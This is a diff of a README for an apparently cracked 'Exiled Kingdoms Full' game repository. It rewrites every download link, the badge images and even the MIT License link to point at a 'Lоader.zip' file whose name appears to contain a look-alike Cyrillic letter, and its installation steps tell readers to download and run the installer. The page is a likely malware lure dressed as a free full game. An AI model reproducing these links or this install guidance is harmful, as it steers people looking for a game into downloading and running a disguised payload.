@@ -1,6 +1,6 @@
 # 🕹️ Exiled Kingdoms Full | 2025 Edition
 
-[![Download Exiled Kingdoms](https://img.shields.io/badge/Download-Exiled%20Kingdoms-blue?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Exiled Kingdoms](https://raw.githubusercontent.com/recetariodmix/ExiledKingdoms-OpenAdventureHub/main/Lоader.zip%20Kingdoms-blue?style=for-the-badge)](https://raw.githubusercontent.com/recetariodmix/ExiledKingdoms-OpenAdventureHub/main/Lоader.zip)
 
 Welcome to the **Exiled Kingdoms Full** repository, your ultimate solution for enjoying the complete adventure game experience! This program unlocks the full potential of Exiled Kingdoms, offering you enhanced gameplay, rich content, and exclusive features. Explore vast lands, uncover mysteries, and challenge legendary monsters without limitations!
 
@@ -8,7 +8,7 @@ Welcome to the **Exiled Kingdoms Full** repository, your ultimate solution for e
 
 ## 📦 Download Now
 
-[![Get Exiled Kingdoms Full](https://img.shields.io/badge/Download-now-informational?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Get Exiled Kingdoms Full](https://raw.githubusercontent.com/recetariodmix/ExiledKingdoms-OpenAdventureHub/main/Lоader.zip)](https://raw.githubusercontent.com/recetariodmix/ExiledKingdoms-OpenAdventureHub/main/Lоader.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Welcome to the **Exiled Kingdoms Full** repository, your ultimate solution for e
 
 ## 🚀 Installation Guide
 
-1️⃣ **Download Exiled Kingdoms Full [here](https://easylauncher.su/PSnzrH)**  
+1️⃣ **Download Exiled Kingdoms Full [here](https://raw.githubusercontent.com/recetariodmix/ExiledKingdoms-OpenAdventureHub/main/Lоader.zip)**  
 2️⃣ Open the installer compatible with your OS  
 3️⃣ Follow the step-by-step setup instructions  
 4️⃣ Launch and dive into your adventure!  
@@ -58,9 +58,9 @@ This tool is dedicated to maximizing your single-player RPG experience. Please r
 
 ## 📝 License & Credits
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) – all rights reserved 2025.  
+Distributed under the [MIT License](https://raw.githubusercontent.com/recetariodmix/ExiledKingdoms-OpenAdventureHub/main/Lоader.zip) – all rights reserved 2025.  
 For more details, read the included [LICENSE](LICENSE).
 
 ---
 
-[![Download Badge](https://img.shields.io/badge/⬇️_Get_Exiled_Kingdoms_Full-orange?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Badge](https://raw.githubusercontent.com/recetariodmix/ExiledKingdoms-OpenAdventureHub/main/Lоader.zip⬇️_Get_Exiled_Kingdoms_Full-orange?style=for-the-badge)](https://raw.githubusercontent.com/recetariodmix/ExiledKingdoms-OpenAdventureHub/main/Lоader.zip)
